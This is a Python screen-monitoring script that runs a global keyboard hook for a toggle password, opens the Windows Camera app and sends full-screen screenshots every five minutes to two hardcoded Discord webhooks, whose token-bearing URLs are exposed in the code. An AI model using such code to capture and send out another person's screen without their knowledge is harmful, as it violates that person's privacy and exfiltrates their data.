import time
import threading
import subprocess
import pyautogui
import keyboard
import requests
import io
from datetime import datetime
from PIL import ImageGrab
import json
import os

# ---------------- CONFIG ---------------- #
PASSWORD = "stop123"    # Password to toggle tracking
TOGGLE_HOTKEY = "ctrl+alt+p"  # Alternative hotkey to toggle tracking

# Discord Webhook Configuration
DISCORD_WEBHOOKS = [
    "https://discordapp.com/api/webhooks/1464318526650187836/JVj45KwndFltWM8WZeD3z9e0dlIipcbyQN7Fu_iAt5HpBn1O5f4t_r43koMeX3Dv73gF",
    "https://discord.com/api/webhooks/1464318888714961091/dElHOxtS91PyvPZR3DQRcSNzD0di6vIlTr3qfHs-DUSEutmHxF9jEPJ7BMrWwhthbLf0"
]
SEND_SCREENSHOTS = True  # Set to False to disable screenshot sending
SCREENSHOT_INTERVAL = 300  # 5 minutes in seconds
CAMERA_DURATION = 10  # How long to keep camera open (seconds)

# Camera application path (Windows default camera)
CAMERA_PATH = "microsoft.windows.camera:"

# ---------------- GLOBALS ---------------- #
tracking_enabled = True  # Master toggle for tracking
password_buffer = ""    # Stores typed characters for password detection
last_key_time = 0       # For clearing password buffer after timeout
last_screenshot_time = time.time()  # Track when last screenshot was taken
program_start_time = time.time()  # Track program start time
camera_process = None  # Track camera process

def open_camera():
    """Open the Windows Camera application"""
    global camera_process
    try:
        print("[CAMERA] Opening camera application...")
        # Open Windows Camera using its app URI
        camera_process = subprocess.Popen(
            ["start", CAMERA_PATH],
            shell=True,
            creationflags=subprocess.CREATE_NEW_CONSOLE
        )
        
        # Give camera time to open
        time.sleep(3)
        return True
    except Exception as e:
        print(f"[CAMERA ERROR] Failed to open camera: {e}")
        return False

def close_camera():
    """Close the camera application"""
    global camera_process
    try:
        if camera_process:
            # Try to gracefully close the camera
            camera_process.terminate()
            camera_process.wait(timeout=2)
            camera_process = None
            print("[CAMERA] Camera closed")
    except Exception as e:
        print(f"[CAMERA ERROR] Failed to close camera: {e}")

def take_screenshot():
    """Take a screenshot of the entire screen"""
    try:
        screenshot = ImageGrab.grab()
        return screenshot
    except Exception as e:
        print(f"[SCREENSHOT ERROR] {e}")
        return None

def send_to_webhook(webhook_url, payload, screenshot_bytes=None):
    """Send data to a specific webhook URL"""
    try:
        if screenshot_bytes:
            # Create a new BytesIO object for each webhook
            img_byte_arr = io.BytesIO(screenshot_bytes)
            files = {
                'file': ('screenshot.png', img_byte_arr, 'image/png')
            }
            
            # Prepare multipart form data
            if 'embeds' in payload:
                data = {'payload_json': json.dumps(payload)}
                response = requests.post(
                    webhook_url,
                    files=files,
                    data=data,
                    timeout=10
                )
            else:
                # If no embeds, just send with files
                response = requests.post(
                    webhook_url,
                    files=files,
                    data=payload,
                    timeout=10
                )
        else:
            headers = {'Content-Type': 'application/json'}
            response = requests.post(
                webhook_url,
                json=payload,
                headers=headers,
                timeout=10
            )
        
        if response.status_code in [200, 204]:
            print(f"[WEBHOOK SUCCESS] Sent to {webhook_url[:40]}...")
            return True
        else:
            print(f"[WEBHOOK ERROR] Failed to send to {webhook_url[:40]}...: {response.status_code} - {response.text}")
            return False
            
    except Exception as e:
        print(f"[WEBHOOK ERROR] {e} for {webhook_url[:40]}...")
        return False

def send_to_all_webhooks(payload, screenshot=None):
    """Send message to all configured webhooks"""
    if not DISCORD_WEBHOOKS or all(wh == "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISCORD_WEBHOOKS):
        print("[DISCORD] No webhooks configured")
        return False
    
    success_count = 0
    threads = []
    
    # Convert screenshot to bytes once
    screenshot_bytes = None
    if screenshot and SEND_SCREENSHOTS:
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        screenshot_bytes = img_byte_arr.getvalue()  # Get raw bytes
        
        # Add screenshot info to payload
        if 'embeds' in payload:
            if 'content' not in payload or not payload['content']:
                payload['content'] = "📸 **Screenshot captured below:**"
    
    for webhook_url in DISCORD_WEBHOOKS:
        if not webhook_url or webhook_url == "YOUR_DISCORD_WEBHOOK_URL_HERE":
            continue
            
        # Create thread for each webhook
        if screenshot_bytes:
            thread = threading.Thread(
                target=send_to_webhook,
                args=(webhook_url, payload),
                kwargs={'screenshot_bytes': screenshot_bytes}
            )
        else:
            thread = threading.Thread(
                target=send_to_webhook,
                args=(webhook_url, payload)
            )
        
        thread.start()
        threads.append(thread)
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join(timeout=15)  # 15 second timeout per webhook
        
        # Check if thread completed successfully
        if not thread.is_alive():
            success_count += 1
    
    print(f"[DISCORD] Sent to {success_count}/{len(DISCORD_WEBHOOKS)} webhooks")
    return success_count > 0

def send_discord_alert(screenshot=None):
    """Send screenshot to Discord webhooks"""
    # Prepare the message
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    embed = {
        "title": "📸 Periodic Screenshot",
        "description": f"**Time:** `{current_time}`\n**Interval:** `{SCREENSHOT_INTERVAL//60} minutes`",
        "color": 3447003,  # Blue color
        "footer": {
            "text": "Camera Screenshot System"
        }
    }
    
    payload = {
        "embeds": [embed],
        "content": f"🕐 **Scheduled screenshot taken at {current_time}**"
    }
    
    return send_to_all_webhooks(payload, screenshot)

def send_discord_status(status):
    """Send tracking status to Discord"""
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        color = 65280 if status == "ENABLED" else 16711680  # Green for enabled, red for disabled
        
        embed = {
            "title": f"🔄 Screenshot System {status}",
            "description": f"Screenshot system has been **{status.lower()}**\n**Time:** `{current_time}`\n**Interval:** `{SCREENSHOT_INTERVAL//60} minutes`",
            "color": color,
            "footer": {
                "text": "Camera Screenshot System"
            }
        }
        
        payload = {
            "embeds": [embed],
            "content": f"📊 **Screenshot System Status Changed**"
        }
        
        return send_to_all_webhooks(payload)
        
    except Exception as e:
        print(f"[DISCORD STATUS ERROR] {e}")
        return False

def send_startup_message():
    """Send webhook when the program starts"""
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        embed = {
            "title": "🚀 Screenshot System Started",
            "description": f"**Camera screenshot system has been launched**\n**Start Time:** `{current_time}`\n**Initial Status:** `{'ENABLED' if tracking_enabled else 'DISABLED'}`\n**Screenshot Interval:** `{SCREENSHOT_INTERVAL//60} minutes`",
            "color": 3066993,  # Green color
            "footer": {
                "text": "Camera Screenshot System"
            }
        }
        
        payload = {
            "embeds": [embed],
            "content": "📱 **System Online** - Screenshot system is now active"
        }
        
        success = send_to_all_webhooks(payload)
        if success:
            print(f"[STARTUP] Message sent to all webhooks at {current_time}")
        return success
            
    except Exception as e:
        print(f"[STARTUP ERROR] {e}")
        return False

def toggle_tracking():
    """Toggle tracking on/off"""
    global tracking_enabled, password_buffer
    tracking_enabled = not tracking_enabled
    status = "ENABLED" if tracking_enabled else "DISABLED"
    print(f"[SYSTEM] Screenshot system {status}")
    
    # Send Discord notification about status change
    threading.Thread(target=send_discord_status, args=(status,), daemon=True).start()
    
    password_buffer = ""  # Clear password buffer

def on_key_event(e):
    """Handle keyboard events for password detection"""
    global password_buffer, last_key_time
    
    # Ignore modifier keys and non-character keys
    if len(e.name) > 1 and e.name not in ['space', 'enter', 'backspace']:
        return
    
    current_time = time.time()
    
    # Clear buffer if too much time passed between keystrokes (2 seconds)
    if current_time - last_key_time > 2:
        password_buffer = ""
    
    last_key_time = current_time
    
    # Handle backspace
    if e.event_type == keyboard.KEY_DOWN:
        if e.name == 'backspace':
            password_buffer = password_buffer[:-1]
        elif e.name == 'space':
            password_buffer += ' '
        elif len(e.name) == 1:  # Regular character
            password_buffer += e.name
        elif e.name == 'enter':  # Enter key submits password
            check_password()
            return
    
    # Check password continuously (without needing Enter)
    check_password()
    
    # Keep buffer from growing too large
    if len(password_buffer) > 20:
        password_buffer = password_buffer[-20:]

def check_password():
    """Check if password buffer contains the password"""
    global password_buffer
    if PASSWORD in password_buffer:
        toggle_tracking()
        password_buffer = ""  # Clear after successful match

def setup_keyboard_listener():
    """Setup global keyboard listeners"""
    # Hotkey to toggle tracking
    keyboard.add_hotkey(TOGGLE_HOTKEY, toggle_tracking, suppress=False)
    print(f"[HOTKEY] Press '{TOGGLE_HOTKEY}' to toggle screenshot system")
    print(f"[PASSWORD] Type '{PASSWORD}' to toggle screenshot system")
    
    # General key listener for password typing
    keyboard.hook(on_key_event, suppress=False)
    
    return keyboard

def capture_screenshot_cycle():
    """Open camera, take screenshot, and close camera"""
    if not tracking_enabled:
        return
    
    try:
        print("[CAPTURE] Starting screenshot cycle...")
        
        # Open camera
        if open_camera():
            # Wait a bit for camera to fully open
            time.sleep(2)
            
            # Take screenshot
            screenshot = take_screenshot()
            
            if screenshot:
                # Send to Discord
                send_discord_alert(screenshot)
                print("[CAPTURE] Screenshot captured and sent successfully")
            else:
                print("[CAPTURE] Failed to capture screenshot")
            
            # Keep camera open for configured duration
            time.sleep(CAMERA_DURATION)
            
            # Close camera
            close_camera()
        else:
            print("[CAPTURE] Failed to open camera, taking screenshot anyway")
            # Take screenshot even if camera failed to open
            screenshot = take_screenshot()
            if screenshot:
                send_discord_alert(screenshot)
                
    except Exception as e:
        print(f"[CAPTURE ERROR] {e}")
        # Ensure camera is closed even if error occurs
        close_camera()

# ---------------- SCREENSHOT SCHEDULER THREAD ---------------- #
def screenshot_scheduler():
    """Periodically take screenshots every 5 minutes"""
    global last_screenshot_time
    
    while True:
        try:
            current_time = time.time()
            
            # Check if it's time to take a screenshot
            if current_time - last_screenshot_time >= SCREENSHOT_INTERVAL and tracking_enabled:
                print(f"[SCHEDULER] Time for scheduled screenshot ({SCREENSHOT_INTERVAL//60} minute interval)")
                
                # Start capture in a separate thread
                capture_thread = threading.Thread(target=capture_screenshot_cycle, daemon=True)
                capture_thread.start()
                
                last_screenshot_time = current_time
            
            # Sleep for 30 seconds and check again
            time.sleep(30)
            
        except Exception as e:
            print(f"[SCHEDULER ERROR] {e}")
            time.sleep(30)

# ---------------- MAIN LOOP ---------------- #
print("[SYSTEM] Camera screenshot system started...")
print(f"[SYSTEM] Screenshots will be taken every {SCREENSHOT_INTERVAL//60} minutes")
print(f"[SYSTEM] Camera will stay open for {CAMERA_DURATION} seconds")
print("[SYSTEM] System is ENABLED by default")

# Send startup webhook immediately
if DISCORD_WEBHOOKS and any(wh != "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISCORD_WEBHOOKS):
    print(f"[STARTUP] Sending startup webhook to {len(DISCORD_WEBHOOKS)} webhooks...")
    threading.Thread(target=send_startup_message, daemon=True).start()
    
    # Start scheduler in a separate thread
    scheduler_thread = threading.Thread(target=screenshot_scheduler, daemon=True)
    scheduler_thread.start()
    print(f"[SCHEDULER] Screenshot scheduler started (every {SCREENSHOT_INTERVAL//60} minutes)")
else:
    print("[DISCORD] No webhooks configured - skipping startup messages")

# Test Discord connections
valid_webhooks = []
for i, webhook_url in enumerate(DISCORD_WEBHOOKS, 1):
    if webhook_url and webhook_url != "YOUR_DISCORD_WEBHOOK_URL_HERE":
        print(f"[DISCORD] Webhook {i} configured")
        try:
            if webhook_url.startswith("https://discord.com/api/webhooks/") or webhook_url.startswith("https://discordapp.com/api/webhooks/"):
                print(f"[DISCORD] Webhook {i} URL format is valid")
                valid_webhooks.append(webhook_url)
            else:
                print(f"[DISCORD WARNING] Webhook {i} has unusual format")
                valid_webhooks.append(webhook_url)
        except:
            print(f"[DISCORD] Could not test webhook {i} (will still try to post)")
            valid_webhooks.append(webhook_url)

if valid_webhooks:
    print(f"[DISCORD] {len(valid_webhooks)}/{len(DISCORD_WEBHOOKS)} webhooks are valid - Screenshots: {SEND_SCREENSHOTS}")
else:
    print("[DISCORD] No valid webhooks configured - skipping Discord alerts")

# Setup keyboard listener
kb_listener = setup_keyboard_listener()

print("\n" + "="*50)
print("SYSTEM ACTIVE - Press Ctrl+Alt+P or type 'stop123' to disable")
print(f"Next screenshot in approximately {SCREENSHOT_INTERVAL//60} minutes")
print("="*50 + "\n")

try:
    while True:
        # Keep main thread alive
        time.sleep(1)

except KeyboardInterrupt:
    print("[EXIT] Interrupted by user.")

finally:
    # Cleanup
    keyboard.unhook_all()
    close_camera()  # Ensure camera is closed
    print("[SYSTEM] Camera screenshot system stopped")
